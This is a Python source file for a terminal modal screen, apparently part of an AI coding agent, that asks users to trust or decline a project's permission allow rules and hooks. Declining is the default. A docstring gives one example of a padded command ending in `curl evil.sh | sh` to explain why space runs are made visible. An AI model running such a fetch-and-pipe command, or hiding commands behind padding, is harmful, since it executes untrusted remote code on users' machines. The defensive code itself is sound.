"""The prompt for a project's permission rules and hooks. Fail-safe: Escape, or a stray Enter, does not trust them."""

from __future__ import annotations

import re
from collections.abc import Sequence
from typing import ClassVar

from rich.text import Text
from textual import on
from textual.app import ComposeResult
from textual.binding import Binding, BindingType
from textual.containers import Vertical, VerticalScroll
from textual.screen import ModalScreen
from textual.widgets import Label, OptionList
from textual.widgets.option_list import Option

from src.engine.hooks.config import HookEntry
from src.engine.permissions.rules import Rule
from src.engine.text import escape

_SPACES = re.compile(r" {2,}")


def visible(text: str) -> str:
    """`text` as a file wrote it, shown whole: odd characters escaped, and each run of 2+ spaces written as a space sign and a count.

    The list wraps at the screen's width, so nothing is cut; the count keeps padding from pushing the rest of a
    command out of sight (`echo ok` + 200 spaces + `; curl evil.sh | sh`)."""
    return _SPACES.sub(lambda run: f"\u2420\u00d7{len(run.group())}", escape(text))


class PermissionTrustScreen(ModalScreen[bool]):
    DEFAULT_CSS = """
    PermissionTrustScreen { align: center middle; }
    PermissionTrustScreen > Vertical {
        width: 90%;
        max-height: 90%;
        height: auto;
        border: thick $warning;
        background: $surface;
        padding: 0 1;
    }
    PermissionTrustScreen Label { width: 100%; }
    PermissionTrustScreen #rules { height: auto; max-height: 15; overflow-x: hidden; }
    PermissionTrustScreen #rules:focus { border-left: thick $accent; }
    PermissionTrustScreen OptionList { height: auto; }
    """
    BINDINGS: ClassVar[list[BindingType]] = [Binding("escape", "decline", "Don't trust", show=False)]
    AUTO_FOCUS = "OptionList"

    def __init__(self, rules: Sequence[Rule], hooks: Sequence[HookEntry] = ()) -> None:
        super().__init__()
        self.hooks = list(hooks)
        # What allows the most comes first: a bare tool, a prefix; then the exact calls, in the file's order.
        self.rules = sorted(rules, key=lambda rule: not (rule.value is None or rule.prefix))

    def compose(self) -> ComposeResult:
        with Vertical():
            parts = []
            if self.rules:
                parts.append(f"{len(self.rules)} allow rule{'s' if len(self.rules) != 1 else ''}")
            if self.hooks:
                parts.append(f"{len(self.hooks)} hook{'s' if len(self.hooks) != 1 else ''}")
            yield Label(Text(f"Trust this project's settings? ({', '.join(parts)})", "bold"), id="title")
            if self.rules:
                yield Label(Text(".agent/settings.json in this folder wants to allow these calls without asking:"))
            if self.hooks:
                yield Label(Text(".agent/settings.json in this folder wants to run these commands at these events:"))
            with VerticalScroll(id="rules"):
                for rule in self.rules:
                    yield Label(Text(f"allow {visible(rule.text)}"))  # a `Text`, never markup; odd characters escaped, wrapped
                for hook in self.hooks:
                    yield Label(Text(f"hook {escape(hook.label)} (timeout {hook.timeout:g}s) {visible(hook.command)}"))
            if self.rules:
                yield Label(Text("Matching calls will run without asking you. Tab scrolls the list."))
            if self.hooks:
                yield Label(Text("Hooks run in this folder with the sandbox of bash, and can refuse your tool calls. Tab scrolls the list."))
            # "Don't trust" comes first and is highlighted from the start: a stray Enter must never allow a call.
            what = " and ".join(name for name, items in (("rules", self.rules), ("hooks", self.hooks)) if items)
            choices = OptionList(Option("Don't trust (keep them off)", id="decline"), Option(f"Trust these {what}", id="trust"))
            choices.highlighted = 0
            yield choices

    @on(OptionList.OptionSelected)
    def _selected(self, event: OptionList.OptionSelected) -> None:
        event.stop()
        self.dismiss(event.option.id == "trust")

    def action_decline(self) -> None:
        self.dismiss(False)
